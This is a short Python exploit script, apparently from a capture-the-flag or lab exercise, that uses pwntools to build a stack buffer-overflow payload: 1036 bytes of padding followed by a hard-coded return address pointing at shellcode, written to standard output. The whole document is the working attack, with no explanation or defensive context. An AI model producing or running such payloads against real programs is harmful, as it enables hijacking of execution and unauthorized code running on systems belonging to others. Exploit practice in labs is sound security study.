#!/usr/bin/python3
import sys
from pwn import p32

shellcode_address = 0xffffd510

payload = b'A'*1036
payload += p32(shellcode_address)

sys.stdout.buffer.write(payload)
